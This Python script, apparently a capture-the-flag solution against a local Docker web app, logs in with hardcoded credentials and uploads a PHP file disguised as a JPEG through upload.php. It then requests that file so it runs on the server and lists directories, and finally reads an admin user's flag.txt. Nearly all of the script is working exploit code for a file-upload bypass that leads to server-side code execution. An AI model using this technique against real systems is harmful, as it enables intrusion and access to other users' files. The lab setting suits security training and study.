import requests

session = requests.session()

# 端口以docker为准，这里使用8088

# 首次登陆获取cookies
burp0_url = "http://127.0.0.1:8088/php/login_check.php"
burp0_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1:8088", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1:8088/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp0_data = {"username": "diemandcarpe", "password": "54385ps"}
r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)

for cookie in r.cookies:
    phpsessid = str(cookie.value)
    
    break

# print(phpsessid)

burp1_url = "http://127.0.0.1:8088/php/upload.php"
burp1_cookies = {"loggedInUser": "diemandcarpe", "PHPSESSID": phpsessid}
burp1_headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://127.0.0.1:8088", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryAeQDPAqAkGvrZU6g", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://127.0.0.1:8088/php/home.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp1_data = "------WebKitFormBoundaryAeQDPAqAkGvrZU6g\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfunction tree($directory)\r\n\r\n{\r\n\r\n    $mydir=dir($directory);\r\n\r\n    while($file=$mydir->read()){\r\n\r\n        if((is_dir(\"$directory/$file\")) AND ($file!=\".\") AND ($file!=\"..\"))\r\n\r\n        {\r\n\r\n            echo \"$file\\n\";\r\n\r\n            tree(\"$directory/$file\");\r\n\r\n    } else\r\n\r\n    echo \"$file\\n\";\r\n\r\n    }\r\n\r\n    echo \"\\n\";\r\n\r\n    $mydir->close();\r\n\r\n}\r\n\r\ntree(\"../\");\r\n?>\r\n------WebKitFormBoundaryAeQDPAqAkGvrZU6g\r\nContent-Disposition: form-data; name=\"private\"\r\n\r\n0\r\n------WebKitFormBoundaryAeQDPAqAkGvrZU6g--\r\n"
session.get(burp1_url)
session.post(burp1_url, headers=burp1_headers, cookies=burp1_cookies, data=burp1_data)

session.close

session = requests.session()
url = 'http://127.0.0.1:8088/image/diemandcarpe/1.php'  # 网站地址
r = session.get(url)
print(r.text)
session.close

session = requests.session()
url = 'http://127.0.0.1:8088/image/admin/flag.txt'  # 网站地址
r = session.get(url)
print(r.text)
session.close